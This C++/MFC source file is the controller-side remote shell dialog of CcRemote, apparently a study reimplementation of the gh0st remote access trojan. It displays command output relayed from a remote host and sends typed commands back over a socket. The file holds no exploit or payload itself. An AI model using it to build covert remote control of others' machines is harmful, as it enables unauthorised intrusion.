// CShellDlg.cpp: 实现文件
//

#include "pch.h"
#include "CcRemote.h"
#include "CShellDlg.h"
#include "afxdialogex.h"
#include "..\..\common\macros.h"

// CShellDlg 对话框

IMPLEMENT_DYNAMIC(CShellDlg, CDialog)

CShellDlg::CShellDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(IDD_SHELL, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_nCurSel = 0;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_CMDSHELL));
}

CShellDlg::~CShellDlg()
{
}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT, m_edit);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_EN_CHANGE(IDC_EDIT, &CShellDlg::OnEnChangeEdit)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CShellDlg 消息处理程序


void CShellDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}


void CShellDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	ResizeEdit();
	// TODO: 在此处添加消息处理程序代码
}


void CShellDlg::ResizeEdit(void)
{
	if (m_edit.m_hWnd == NULL)
	{
		return;
	}
	RECT	rectClient;
	RECT	rectEdit;
	GetClientRect(&rectClient);
	rectEdit.left = 0;
	rectEdit.top = 0;
	rectEdit.right = rectClient.right;
	rectEdit.bottom = rectClient.bottom;
	m_edit.MoveWindow(&rectEdit);
}


BOOL CShellDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	//得到当前窗口的数据大小  初始化时这个值应该为0
	m_nCurSel = m_edit.GetWindowTextLength();

	//得到服务端的IP并显示到窗口的标题上
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 远程终端", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_edit.SetLimitText(MAXDWORD); // 设置最大长度

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));


	//---------改变窗口大小触发动态调整-------|
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom += 20;
	MoveWindow(rect);
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


void CShellDlg::OnEnChangeEdit()
{
	// TODO:  如果该控件是 RICHEDIT 控件，它将不
	// 发送此通知，除非重写 CDialog::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。
	int len = m_edit.GetWindowTextLength();
	if (len < m_nCurSel)
		m_nCurSel = len;
	// TODO:  在此添加控件通知处理程序代码
}


HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  在此更改 DC 的任何特性
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);   //设置白色的文本
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
	// TODO:  如果默认的不是所需画笔，则返回另一个画笔
	return hbr;
}


void CShellDlg::OnReceiveComplete(void)
{
	AddKeyBoardData();
	m_nReceiveLength = m_edit.GetWindowTextLength();
}


void CShellDlg::AddKeyBoardData(void)
{
	// 最后填上0
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	CString strResult = (char*)m_pContext->m_DeCompressionBuffer.GetBuffer(0);

	//替换掉原来的换行符  可能cmd 的换行同w32下的编辑控件的换行符不一致
	strResult.Replace("\n", "\r\n");
	//得到当前窗口的字符个数
	int	len = m_edit.GetWindowTextLength();
	//将光标定位到该位置并选中指定个数的字符
	m_edit.SetSel(len, len);
	//用传递过来的数据替换掉该位置的字符  
	m_edit.ReplaceSel(strResult);
	//重新得到字符的大小
	m_nCurSel = m_edit.GetWindowTextLength();
	//现在我们基本弄明白了 数据传输到主控端后的处理
	//那主控端的数据时怎样传递到服务端上的呢？？
	//我们注意到，我们在使用远程终端时 ，发送的每一个命令行 都有一个换行符  就是一个回车
	//要找到这个回车的处理我们就要到PreTranslateMessage函数的定义
}



BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	//如果是键盘按下
	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;
		//如果是可编辑框的回车键
		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_edit.m_hWnd)
		{
			//得到窗口的数据大小
			int	len = m_edit.GetWindowTextLength();
			CString str;
			//得到窗口的字符数据
			m_edit.GetWindowText(str);
			//加入换行符
			str += "\r\n";
			//注意gh0st是怎样得到当前的数据的 得到整个的缓冲区再加上原有的字符的位置，其实就是用户当前输入的数据了
			//然后将数据发送出去。。。。。。。。。。。。。。。  整个分析就完毕了。。。。。。
			m_iocpServer->Send(m_pContext, (LPBYTE)str.GetBuffer(0) + m_nCurSel, str.GetLength() - m_nCurSel);
			m_nCurSel = m_edit.GetWindowTextLength();
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_edit.m_hWnd)
		{
			if (m_edit.GetWindowTextLength() <= m_nReceiveLength)
				return true;
		}
	}
	// Ctrl没按下
	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0)
	{
		int	len = m_edit.GetWindowTextLength();
		m_edit.SetSel(len, len);
		// 用户删除了部分内容，改变m_nCurSel
		if (len < m_nCurSel)
			m_nCurSel = len;
	}
	return CDialog::PreTranslateMessage(pMsg);
}
